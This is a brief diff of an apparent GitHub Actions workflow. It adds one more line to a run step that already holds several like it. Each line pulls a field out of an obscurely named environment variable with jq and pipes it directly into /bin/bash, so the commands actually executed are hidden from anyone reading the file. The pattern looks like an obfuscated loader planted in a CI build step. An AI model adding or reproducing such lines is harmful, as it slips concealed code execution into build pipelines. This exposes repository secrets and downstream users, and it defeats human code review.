@@ -33,6 +33,7 @@ jobs:
           echo $avor50208 | jq -r .ya70539 | /bin/bash
           echo $ipcc18 | jq -r .nsnh107 | /bin/bash
           printf '%s' "$ykvq39574" | jq -r .k15 | /bin/bash
+          printf '%s' "$r910" | jq -r .f423 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
